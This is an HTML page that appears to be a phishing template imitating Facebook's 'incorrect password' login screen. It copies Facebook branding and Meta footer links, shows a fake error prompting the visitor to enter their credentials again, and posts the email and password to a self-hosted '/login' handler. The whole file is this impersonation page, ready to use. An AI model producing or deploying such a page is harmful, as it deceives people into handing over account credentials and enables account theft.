<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook - incorrect password</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { min-height: 100%; }
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; color: #050505; }
    .page-header { background: #3b5998; padding: 18px 20px; text-align: left; }
    .page-header .logo { font-size: 36px; font-weight: 700; color: #fff; letter-spacing: -1px; }
    .container { max-width: 420px; margin: 48px auto 0; padding: 0 20px; }
    .card { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.08); }
    .card h2 { font-size: 18px; color: #1d2129; margin-bottom: 18px; }
    .error-box { background: #f7d7d3; border-left: 4px solid #d93025; border-radius: 6px; padding: 14px 16px; margin-bottom: 18px; }
    .error-box p { color: #a1241d; font-size: 14px; line-height: 1.5; }
    .error-box a { color: #1877f2; text-decoration: none; font-weight: 700; }
    .error-box a:hover { text-decoration: underline; }
    .form-group { margin-bottom: 14px; }
    input { width: 100%; padding: 12px 14px; border: 1px solid #ccd0d5; border-radius: 8px; background: #f5f6f7; font-size: 15px; }
    input:focus { outline: none; border-color: #1877f2; background: #fff; }
    button { width: 100%; padding: 12px 14px; border: none; border-radius: 8px; background: #1877f2; color: #fff; font-size: 15px; font-weight: 700; cursor: pointer; }
    button:hover { background: #165ac5; }
    .forgot { text-align: center; margin-top: 12px; }
    .forgot a { color: #1877f2; text-decoration: none; font-size: 13px; }
    .forgot a:hover { text-decoration: underline; }
    .footer { text-align: center; margin-top: 40px; padding: 20px; color: #8a8d91; font-size: 12px; }
    .footer a { color: #8a8d91; text-decoration: none; margin: 0 8px; }
    .footer a:hover { text-decoration: underline; }
    @media (max-width: 480px) { .page-header, .container { padding-left: 12px; padding-right: 12px; } }
  </style>
</head>
<body>
  <header class="page-header">
    <div class="logo">facebook</div>
  </header>
  <main class="container">
    <div class="card">
      <h2>Log Into Facebook</h2>
      <div class="error-box">
        <p>The password you've entered is incorrect. <a href="#">Forgot Password?</a></p>
      </div>
      <form method="POST" action="/login">
        <div class="form-group">
          <input type="email" name="email" placeholder="Email or phone number" required autocomplete="username" />
        </div>
        <div class="form-group">
          <input type="password" name="pass" placeholder="Password" required autocomplete="current-password" />
        </div>
        <button type="submit">Log In</button>
        <div class="forgot">
          <a href="#">Forgot password?</a>
        </div>
      </form>
    </div>
  </main>
  <footer class="footer">
    <a href="#">English (US)</a>
    <a href="#">Français</a>
    <a href="#">Tiếng Việt</a>
    <a href="#">中文(简体)</a>
    <a href="#">Español</a>
    <a href="#">Português (Brasil)</a>
    <a href="#">Deutsch</a>
    <a href="#">한국어</a>
    <br /><br />
    <a href="#">Sign Up</a>
    <a href="#">Log In</a>
    <a href="#">Messenger</a>
    <a href="#">Facebook Lite</a>
    <a href="#">Video</a>
    <a href="#">Meta Store</a>
    <a href="#">Instagram</a>
    <br /><br />
    <a href="#">Privacy Policy</a>
    <a href="#">Cookies</a>
    <a href="#">Terms</a>
    <a href="#">Help</a>
    <br /><br />
    Meta © 2026
  </footer>
</body>
</html>
